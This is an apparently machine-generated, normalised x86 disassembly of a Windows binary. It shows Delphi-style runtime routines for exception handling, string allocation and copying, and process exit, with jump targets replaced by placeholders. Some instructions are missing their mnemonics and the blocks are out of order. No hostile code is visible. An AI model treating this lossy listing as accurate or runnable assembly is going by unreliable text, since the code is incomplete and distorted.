sub_4037d8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push ebx
jmp r-xdata
push esp
push 0x1
push 0x0
push 0xeedfae0
call [ rw-data ]
add esp 0x4
pop eax
retn
sub_4037ec
test ecx ecx
je r-xdata
retn
mov eax [ ecx + 0x1 ]
cmp [ ecx ] 0xe9
je r-xdata
add ecx 0x5
cmp [ ecx ] 0xeb
jne r-xdata
movsx eax al
inc ecx
inc ecx
jmp r-xdata
add ecx eax
sub_40380c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push eax
push edx
push ecx
call sub_4037ec
push ecx
push esp
push 0x1
push 0x0
push 0xeedfae1
call [ rw-data ]
pop ecx
pop ecx
pop edx
pop eax
sub_403870
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
cld
call sub_4032c4
mov edx [ rw-data ]
test edx edx
je r-xdata
or [ eax + 0x4 ] 0x2
push ebx
xor ebx ebx
push esi
push edi
push ebp
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
mov edi [ esp + 0x28 ]
call sub_40629c
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ edi + 0x4 ] r-xdata
add ebx 0x5
call sub_4037d8
jmp ebx
cmp [ rw-data ] 0x0
ja r-xdata
call edx
test eax eax
je r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
cmp [ ecx ] 0xeefface
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
call sub_403788
cmp [ rw-data ] 0x0
jbe r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edx eax
mov eax [ esp + 0x4 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
sub_40399c
mov eax [ esp + 0x4 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
mov eax 0x1
retn
cmp [ eax ] 0xeedfade
je r-xdata
mov eax [ eax + 0x18 ]
mov eax [ eax ]
cld
call sub_4032c4
mov edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp [ eax ] 0xeedfade
mov edx [ eax + 0x18 ]
mov ecx [ eax + 0x14 ]
je r-xdata
mov edi ebp
jmp r-xdata
call edx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x1
jbe r-xdata
call [ rw-data ]
mov edx [ esp + 0x1c ]
call sub_403788
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax [ eax ]
cmp eax edi
je r-xdata
mov edx [ esp + 0x8 ]
push ebx
push esi
push edi
push ebp
mov ecx [ edx + 0x4 ]
mov ebx [ ecx + 0x5 ]
lea esi [ ecx + 0x9 ]
mov ebp eax
jmp r-xdata
xor ebx ebx
mov ebx [ fs : ebx ]
push ebx
push eax
push edx
push ecx
mov edx [ esp + 0x28 ]
or [ eax + 0x4 ] 0x2
push esi
push 0x0
push eax
push r-xdata
push edx
call [ rw-data ]
pop ebx
mov edi [ esp + 0x28 ]
call sub_40629c
push [ eax ]
mov [ eax ] esp
mov ebp [ edi + 0x8 ]
mov [ edi + 0x4 ] r-xdata
mov eax [ esp + 0x8 ]
call sub_4037c4
jmp [ ebx + 0x4 ]
cmp [ rw-data ] 0x0
ja r-xdata
mov edx eax
mov eax [ esp + 0x14 ]
mov ecx [ eax + 0xc ]
jmp r-xdata
cmp [ rw-data ] 0x0
ja r-xdata
mov ecx [ eax - 0x28 ]
cmp ecx [ edi - 0x28 ]
jne r-xdata
push eax
lea eax [ esp + 0x8 ]
push edx
push ecx
push eax
call UnhandledExceptionFilter
cmp eax 0x0
pop ecx
pop edx
pop eax
je r-xdata
lea ecx [ esp + 0x4 ]
push eax
push ecx
call UnhandledExceptionFilter
cmp eax 0x0
pop eax
je r-xdata
mov edi [ edi - 0x24 ]
mov eax [ esi ]
test edi edi
jne r-xdata
mov eax [ eax - 0x2c ]
mov edx [ edi - 0x2c ]
xor ecx ecx
mov cl [ eax ]
cmp cl [ edx ]
jne r-xdata
mov edi [ edi ]
add esi 0x8
dec ebx
jne r-xdata
inc eax
inc edx
call sub_402d34
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
jmp r-xdata
sub_403b24
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
test [ eax + 0x4 ] 0x6
je r-xdata
mov eax 0x1
retn
mov ecx [ edx + 0x4 ]
mov [ edx + 0x4 ] r-xdata
push ebx
push esi
push edi
push ebp
mov ebp [ edx + 0x8 ]
add ecx 0x5
call sub_40380c
call ecx
pop ebp
pop edi
pop esi
pop ebx
sub_403b5c
or eax eax
jne r-xdata
pop edx
push esp
push ebp
push edi
push esi
push ebx
push eax
push edx
push esp
push 0x7
push 0x1
push 0xeedfade
push edx
jmp [ rw-data ]
mov eax 0xd8
call sub_404114
sub_403b84
mov eax [ esp + 0x30 ]
mov [ eax + 0x4 ] r-xdata
call sub_40629c
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0xc ]
and [ eax + 0x4 ] 0xfffffffd
cmp [ eax ] 0xeedfade
je r-xdata
xor eax eax
add esp 0x14
mov edx [ fs : eax ]
pop ecx
mov edx [ edx ]
mov [ ecx ] edx
pop ebp
pop edi
pop esi
pop ebx
mov eax 0x1
retn
mov eax [ edx + 0x8 ]
call sub_403390
call sub_40376c
sub_403bd8
call sub_40629c
mov edx [ eax ]
mov ecx [ edx ]
mov [ eax ] ecx
mov eax [ edx + 0x8 ]
call sub_403390
pop edx
mov esp [ esp + 0x2c ]
xor eax eax
pop ecx
mov [ fs : eax ] ecx
pop eax
pop ebp
call sub_403834
jmp edx
sub_403c20
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0xcf
jmp r-xdata
cmp eax 0xc000008e
jg r-xdata
mov al 0xca
jmp r-xdata
sub eax 0x3d
je r-xdata
mov al 0xda
jmp r-xdata
sub eax 0xc0000093
je r-xdata
and eax 0xff
mov edx [ edx + 0xc ]
call sub_4028b8
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd9
jmp r-xdata
jmp r-xdata
mov al 0xce
jmp r-xdata
dec eax
je r-xdata
je r-xdata
mov al 0xc8
jmp r-xdata
sub eax 0xc0000005
je r-xdata
mov al 0xff
mov al 0xc8
jmp r-xdata
dec eax
je r-xdata
mov al 0xcd
jmp r-xdata
jmp r-xdata
mov al 0xd8
jmp r-xdata
sub eax 0x87
je r-xdata
mov al 0xd7
jmp r-xdata
jmp r-xdata
mov al 0xc9
jmp r-xdata
dec eax
je r-xdata
jmp r-xdata
sub_403d80
xor edx edx
mov eax [ rw-data ]
test eax eax
je r-xdata
retn
mov ecx [ fs : edx ]
cmp eax ecx
jne r-xdata
cmp ecx 0xffffffff
je r-xdata
mov eax [ eax ]
mov [ fs : edx ] eax
retn
cmp [ ecx ] eax
jne r-xdata
mov ecx [ ecx ]
mov eax [ eax ]
mov [ ecx ] eax
sub_403da8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov ebx [ edi + 0xc ]
mov esi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403dee
push [ fs : edx ]
mov [ fs : edx ] esp
test ebx ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
mov [ edi + 0xc ] ebx
mov eax [ esi + ebx * 8 + 0x4 ]
test eax eax
je r-xdata
test ebx ebx
jg r-xdata
call eax
sub_403e08
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ eax ]
xor ebx ebx
mov edi [ eax + 0x4 ]
xor edx edx
push ebp
push sub_403e4e
push [ fs : edx ]
mov [ fs : edx ] esp
cmp esi ebx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ edi + ebx * 8 ]
inc ebx
mov [ rw-data ] ebx
test eax eax
je r-xdata
cmp esi ebx
jg r-xdata
call eax
sub_403ea8
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
add eax ebx
add edx ebx
call sub_406030
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403ecc
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add edx ebx
call sub_406030
add esi 0x8
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403ef4
push ebx
xor ebx ebx
push edi
push esi
mov edi [ eax + ebx ]
lea esi [ eax + ebx + 0x4 ]
mov eax [ esi + 0x4 ]
mov edx [ esi ]
mov eax [ eax + ebx ]
add eax [ esi + 0x8 ]
mov [ edx + ebx ] eax
add esi 0xc
dec edi
jne r-xdata
pop esi
pop edi
pop ebx
retn
sub_403f18
push ebx
push esi
push edi
mov esi rw-data
mov cl 0x10
mov ebx [ rw-data ]
mov eax ebx
mov edi 0xa
cdq
idiv edi
add dl 0x30
xor eax eax
mov al cl
mov [ esi + eax ] dl
mov eax ebx
mov ebx 0xa
cdq
idiv ebx
mov ebx eax
dec ecx
test ebx ebx
jne r-xdata
mov cl 0x1c
mov eax [ rw-data ]
mov edx eax
and edx 0xf
mov dl [ edx + rw-data ]
xor ebx ebx
mov bl cl
mov [ esi + ebx ] dl
shr eax 0x4
dec ecx
test eax eax
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_403f74
xor eax eax
xchg [ rw-data ] eax
neg eax
sbb eax eax
inc eax
mov edi rw-data
mov ebx [ edi + 0x18 ]
mov ebp [ edi + 0x14 ]
push [ edi + 0x1c ]
push [ edi + 0x20 ]
mov esi [ edi ]
mov ecx 0xb
[ edi ] [ esi ]
pop edi
pop esi
leave
retn 0xc
sub_403fa4
push ecx
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0xd7b2
jne r-xdata
pop edx
retn
push 0x0
push rw-data
push rw-data
push 0x0
call sub_401324
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x1e
push rw-data
push 0xfffffff5
call sub_4012ec
push eax
call sub_40130c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x2
push r-xdata
push 0xfffffff5
call sub_4012ec
push eax
call sub_40130c
pop edx
retn
cmp [ rw-data ] 0x0
jbe r-xdata
mov eax rw-data
call [ rw-data ]
sub_404030
push ebx
push esi
push edi
push ebp
mov ebx rw-data
mov esi rw-data
mov edi rw-data
cmp [ ebx + 0x28 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi ] 0x0
je r-xdata
cmp [ ebx + 0x28 ] 0x2
jne r-xdata
call sub_403f18
call sub_403fa4
xor eax eax
mov [ rw-data ] eax
mov edx [ edi ]
mov eax edx
xor edx edx
mov [ edi ] edx
mov ebp eax
call ebp
cmp [ edi ] 0x0
jne r-xdata
call sub_403da8
cmp [ ebx + 0x28 ] 0x1
jbe r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
cmp [ esi ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0xc ] eax
call sub_403d80
cmp [ ebx + 0x28 ] 0x1
jne r-xdata
call sub_405ae0
mov edx [ ebx + 0x10 ]
mov eax [ edx + 0x10 ]
cmp eax [ edx + 0x4 ]
je r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
call [ ebx + 0x24 ]
test eax eax
je r-xdata
cmp [ ebx ] 0x0
jne r-xdata
call sub_403f74
push eax
call sub_40133c
mov eax [ ebx ]
push esi
mov esi eax
mov edi ebx
mov ecx 0xb
[ edi ] [ esi ]
pop esi
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esi ]
push eax
call ExitProcess
call [ rw-data ]
sub_404120
mov edx [ eax ]
test edx edx
je r-xdata
retn
mov [ eax ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
jne r-xdata
push eax
lea eax [ edx - 0x8 ]
call sub_4027d4
pop eax
sub_404144
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
test edx edx
je r-xdata
pop esi
pop ebx
retn
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027d4
sub_404174
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jg r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
push eax
push edx
mov eax [ edx - 0x4 ]
call sub_4041e4
mov edx eax
pop eax
push edx
mov ecx [ eax - 0x4 ]
call sub_4029b0
pop edx
pop eax
jmp r-xdata
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027d4
sub_4041b8
test edx edx
je r-xdata
xchg [ eax ] edx
test edx edx
je r-xdata
mov ecx [ edx - 0x8 ]
inc ecx
jle r-xdata
retn
mov ecx [ edx - 0x8 ]
dec ecx
jl r-xdata
[ edx - 0x8 ]
[ edx - 0x8 ]
jne r-xdata
lea eax [ edx - 0x8 ]
call sub_4027d4
sub_4041e4
test eax eax
jle r-xdata
xor eax eax
retn
push eax
add eax 0xa
and eax 0xfffffffe
push eax
call sub_4027b4
pop edx
mov [ edx + eax - 0x2 ] 0x0
add eax 0x8
pop edx
mov [ eax - 0x4 ] edx
mov [ eax - 0x8 ] 0x1
retn
sub_404210
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax edi
call sub_4041e4
mov ecx edi
mov edi eax
test esi esi
je r-xdata
mov eax ebx
call sub_404120
mov [ ebx ] edi
pop edi
pop esi
pop ebx
retn
mov edx eax
mov eax esi
call sub_4029b0
sub_404240
push ebp
mov ebp esp
push 0x0
push 0x0
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call WideCharToMultiByte
pop ebp
retn 0x4
sub_404260
push ebp
mov ebp esp
push edx
push eax
mov eax [ ebp + 0x8 ]
push eax
push ecx
push 0x0
mov eax [ rw-data ]
push eax
call sub_40139c
pop ebp
retn 0x4
sub_40427c
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_404120
jmp r-xdata
mov ebx ebp
add ebx ebx
mov eax edi
mov edx ebx
call sub_40476c
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404240
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0xfff
call sub_404240
mov ebx eax
test ebx ebx
jl r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_40476c
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404210
jmp r-xdata
sub_404318
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404210
push edx
mov ecx edx
pop edx
sub ecx edx
cmp cl [ edx + 0x1 ]
je r-xdata
inc edx
cmp cl [ edx + 0x2 ]
je r-xdata
inc edx
cmp cl [ edx + 0x3 ]
je r-xdata
inc edx
add edx 0x4
jmp r-xdata
cmp cl [ edx ]
je r-xdata
sub_404348
xor ecx ecx
test edx edx
je r-xdata
jmp sub_40427c
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_404390
push edi
push eax
push ecx
mov edi edx
xor eax eax
[ edi ]
jne r-xdata
pop eax
add ecx eax
pop eax
pop edi
jmp sub_404210
not ecx
sub_4043bc
push ebx
test edx edx
je r-xdata
mov [ eax ] 0x0
pop ebx
retn
mov ebx [ edx - 0x4 ]
test ebx ebx
je r-xdata
cmp ecx ebx
jl r-xdata
mov [ eax ] cl
inc eax
xchg edx eax
call sub_4029b0
pop ebx
retn
mov ecx ebx
sub_4043e8
test edx edx
je r-xdata
retn
mov ecx [ eax ]
test ecx ecx
je sub_404174
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi [ ecx - 0x4 ]
mov edx [ esi - 0x4 ]
add edx edi
cmp esi ecx
je r-xdata
call sub_40476c
mov eax [ ebx ]
mov ecx edi
jmp r-xdata
call sub_40476c
mov eax esi
mov ecx [ esi - 0x4 ]
mov edx [ ebx ]
add edx edi
call sub_4029b0
pop edi
pop esi
pop ebx
retn
sub_40442c
test edx edx
je r-xdata
mov edx ecx
jmp sub_404174
test ecx ecx
je sub_404174
cmp edx [ eax ]
je r-xdata
mov edx ecx
jmp sub_4043e8
cmp ecx [ eax ]
je r-xdata
push ebx
push esi
push edi
mov ebx edx
mov esi ecx
push eax
mov eax [ ebx - 0x4 ]
add eax [ esi - 0x4 ]
call sub_4041e4
mov edi eax
mov edx eax
mov eax ebx
mov ecx [ ebx - 0x4 ]
call sub_4029b0
mov edx edi
mov eax esi
mov ecx [ esi - 0x4 ]
add edx [ ebx - 0x4 ]
call sub_4029b0
pop eax
mov edx edi
test edi edi
je r-xdata
push eax
push ecx
call sub_404174
pop edx
pop eax
jmp sub_4043e8
call sub_404174
pop edi
pop esi
pop ebx
retn
dec [ edi - 0x8 ]
sub_4044a0
push ebx
push esi
push edi
push edx
push eax
mov ebx edx
xor edi edi
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ eax ] ecx
jne r-xdata
dec edx
jne r-xdata
add eax [ ecx - 0x4 ]
cmp edi ecx
jne r-xdata
mov edi ecx
mov eax [ ecx - 0x4 ]
dec edx
jmp r-xdata
mov ecx [ esp + edx * 4 + 0x14 ]
test ecx ecx
je r-xdata
test edi edi
je r-xdata
xor edi edi
call sub_4041e4
push eax
mov esi eax
mov edx eax
mov eax [ esp ]
mov esi [ edi - 0x4 ]
call sub_40476c
mov edi [ esp ]
push [ edi ]
add esi [ edi ]
dec ebx
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ eax - 0x4 ]
add esi ecx
call sub_4029b0
mov eax [ esp + ebx * 4 + 0x18 ]
mov edx esi
test eax eax
je r-xdata
pop edx
pop eax
test edi edi
jne r-xdata
pop edx
pop edi
pop esi
pop ebx
pop eax
lea esp [ esp + edx * 4 ]
jmp eax
test edx edx
je r-xdata
call sub_404174
dec [ edx - 0x8 ]
sub_40452c
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x3
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp cl bl
jne r-xdata
pop edx
cmp cl bl
jne r-xdata
dec edx
je r-xdata
dec edx
je r-xdata
cmp ch bh
jne r-xdata
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
cmp ch bh
jne r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cl bl
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
dec edx
je r-xdata
cmp ch bh
jmp r-xdata
and ebx 0xff0000
and ecx 0xff0000
cmp ecx ebx
jne r-xdata
sub_4045ec
mov edx [ eax ]
test edx edx
je r-xdata
mov eax edx
retn
mov ecx [ edx - 0x8 ]
dec ecx
je r-xdata
push ebx
mov ebx eax
mov eax [ edx - 0x4 ]
call sub_4041e4
mov edx eax
mov eax [ ebx ]
mov [ ebx ] edx
push eax
mov ecx [ eax - 0x4 ]
call sub_4029b0
pop eax
mov ecx [ eax - 0x8 ]
dec ecx
jl r-xdata
mov edx [ ebx ]
pop ebx
[ eax - 0x8 ]
jne r-xdata
lea eax [ eax - 0x8 ]
call sub_4027d4
sub_404640
push ebx
test eax eax
je r-xdata
mov eax [ esp + 0x8 ]
call sub_404120
mov ebx [ eax - 0x4 ]
test ebx ebx
je r-xdata
dec edx
jl r-xdata
xor edx edx
jmp r-xdata
cmp edx ebx
jge r-xdata
sub ebx edx
test ecx ecx
jl r-xdata
cmp ecx ebx
jg r-xdata
mov ecx ebx
jmp r-xdata
add edx eax
mov eax [ esp + 0x8 ]
call sub_404210
jmp r-xdata
pop ebx
retn 0x4
sub_404680
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
call j_sub_4045ec
mov edx [ ebx ]
test edx edx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx [ edx - 0x4 ]
dec esi
jl r-xdata
cmp esi ecx
jge r-xdata
test edi edi
jle r-xdata
sub ecx esi
cmp edi ecx
jle r-xdata
sub ecx edi
add edx esi
lea eax [ edi + edx ]
call sub_4029b0
mov edx [ ebx ]
mov eax ebx
mov edx [ edx - 0x4 ]
sub edx edi
call sub_40476c
mov edi ecx
sub_4046c8
test eax eax
je r-xdata
retn
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov edx [ edx ]
push edx
test edx edx
je r-xdata
dec edi
jge r-xdata
mov edx [ edx - 0x4 ]
cmp edi edx
jle r-xdata
xor edi edi
mov ebp [ ebx - 0x4 ]
mov eax esi
add edx ebp
call sub_40476c
pop eax
cmp eax ebx
jne r-xdata
mov edi edx
mov eax [ esi ]
lea edx [ edi + ebp ]
mov ecx [ eax - 0x4 ]
sub ecx edx
add edx eax
add eax edi
call sub_4029b0
mov eax ebx
mov edx [ esi ]
mov ecx ebp
add edx edi
call sub_4029b0
pop ebp
pop edi
pop esi
pop ebx
mov ebx [ esi ]
sub_404724
test eax eax
je r-xdata
retn
test edx edx
je r-xdata
xor eax eax
retn
push ebx
push esi
push edi
mov esi eax
mov edi edx
mov ecx [ edi - 0x4 ]
push edi
mov edx [ esi - 0x4 ]
dec edx
js r-xdata
pop edx
xor eax eax
jmp r-xdata
mov al [ esi ]
inc esi
sub ecx edx
jle r-xdata
pop edi
pop esi
pop ebx
[ edi ]
jne r-xdata
mov ebx ecx
push esi
push edi
mov ecx edx
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
pop edx
mov eax edi
sub eax edx
mov ecx ebx
jmp r-xdata
sub_40476c
push ebx
push esi
push edi
mov ebx eax
mov esi edx
xor edi edi
test edx edx
jle r-xdata
mov eax ebx
call sub_404120
mov [ ebx ] edi
mov eax [ ebx ]
test eax eax
je r-xdata
mov eax edx
call sub_4041e4
mov edi eax
mov eax [ ebx ]
test eax eax
je r-xdata
cmp [ eax - 0x8 ] 0x1
jne r-xdata
mov edx edi
mov ecx [ eax - 0x4 ]
cmp ecx esi
jl r-xdata
sub eax 0x8
add edx 0x9
push eax
mov eax esp
call sub_4027f4
pop eax
add eax 0x8
mov [ ebx ] eax
mov [ eax - 0x4 ] esi
mov [ esi + eax ] 0x0
jmp r-xdata
call sub_4029b0
mov ecx esi
pop edi
pop esi
pop ebx
retn
sub_4047d0
push ebx
push esi
push edi
mov ebx eax
mov esi edx
mov edi ecx
mov eax ecx
call sub_404120
test esi esi
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_4041e4
mov [ edi ] eax
mov edx esi
mov cl bl
call sub_402da4
sub_404844
push ebx
push esi
mov ebx eax
mov esi edx
add ebx 0x4
dec esi
jne r-xdata
mov [ ebx ] 0x0
push eax
call sub_4013dc
mov eax [ ebx ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
sub_404868
test edx edx
je sub_40482c
mov ecx [ edx - 0x4 ]
shr ecx 0x1
je sub_40482c
push ecx
push edx
push eax
call SysReAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402910
retn
sub_40488c
push ebx
push esi
push edi
push ebp
add esp 0xfffff004
push eax
add esp 0xfffffffc
mov esi ecx
mov [ esp ] edx
mov edi eax
test esi esi
jg r-xdata
lea ebp [ esi + 0x1 ]
cmp ebp 0x7ff
jge r-xdata
mov eax edi
call sub_40482c
jmp r-xdata
mov ebx ebp
mov eax edi
mov edx ebx
call sub_404a74
push esi
mov eax [ edi ]
mov ecx [ esp + 0x4 ]
mov edx ebx
call sub_404260
mov ebx eax
test ebx ebx
jge r-xdata
push esi
lea eax [ esp + 0x8 ]
mov ecx [ esp + 0x4 ]
mov edx 0x7ff
call sub_404260
mov ebx eax
test ebx ebx
jle r-xdata
add esp 0x1004
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
mov edx ebx
call sub_404a74
xor ebx ebx
lea edx [ esp + 0x4 ]
mov eax edi
mov ecx ebx
call sub_404918
jmp r-xdata
sub_404918
test ecx ecx
je sub_40482c
push eax
push ecx
push edx
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402910
pop edx
push [ edx ]
mov [ edx ] eax
call sub_4013dc
retn
sub_40493c
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404918
push edx
mov ecx edx
pop edx
sub ecx edx
shr ecx 0x1
cmp cx [ edx + 0x2 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x4 ]
je r-xdata
add edx 0x2
cmp cx [ edx + 0x6 ]
je r-xdata
add edx 0x2
add edx 0x8
jmp r-xdata
cmp cx [ edx ]
je r-xdata
sub_4049a4
push ebx
push esi
push edi
mov esi eax
mov edi edx
cmp eax edx
je r-xdata
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edx [ edi - 0x4 ]
sub eax edx
jmp r-xdata
test edi edi
je r-xdata
mov eax [ esi - 0x4 ]
sub eax edx
jmp r-xdata
mov eax [ esi - 0x4 ]
mov edx [ edi - 0x4 ]
sub eax edx
ja r-xdata
push edx
shr edx 0x2
je r-xdata
add edx eax
pop edx
and edx 0x2
je r-xdata
mov ecx [ esi ]
mov ebx [ edi ]
cmp ecx ebx
jne r-xdata
add eax eax
jmp r-xdata
mov cx [ esi ]
mov bx [ edi ]
cmp cx bx
jne r-xdata
pop edx
cmp cx bx
jne r-xdata
dec edx
je r-xdata
shr ecx 0x10
shr ebx 0x10
cmp cx bx
add esi 0x4
add edi 0x4
mov ecx [ esi + 0x4 ]
mov ebx [ edi + 0x4 ]
cmp ecx ebx
jne r-xdata
add esi 0x8
add edi 0x8
dec edx
jne r-xdata
jmp r-xdata
sub_404a28
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
mov eax esi
call sub_404998
cmp ebx 0x1
jge r-xdata
dec ebx
cmp eax ebx
jge r-xdata
xor ebx ebx
jmp r-xdata
test edi edi
jge r-xdata
mov ebx eax
sub eax ebx
cmp edi eax
jge r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
add edx edx
add edx esi
mov ecx [ ebp + 0x8 ]
xchg ecx eax
call sub_404918
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax edi
sub_404a74
push ebx
push esi
push edi
mov esi edx
mov edi eax
xor ebx ebx
test esi esi
jle r-xdata
mov eax edi
mov edx ebx
call sub_40481c
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_404804
mov ebx eax
mov eax [ edi ]
call sub_404998
test eax eax
jle r-xdata
cmp esi eax
jge r-xdata
mov ecx eax
add ecx ecx
mov edx ebx
mov eax [ edi ]
call sub_4029b0
mov eax esi
sub_404ab8
xor ecx ecx
push ebx
mov cl [ edx + 0x1 ]
push esi
push edi
mov ebx eax
lea esi [ ecx + edx + 0xa ]
mov edi [ ecx + edx + 0x6 ]
mov edx [ esi ]
mov eax [ esi + 0x4 ]
add eax ebx
mov edx [ edx ]
mov ecx 0x1
call sub_404ae8
add esi 0x8
dec edi
jg r-xdata
pop edi
pop esi
pop ebx
retn
sub_404ae8
test ecx ecx
je r-xdata
retn
push ebx
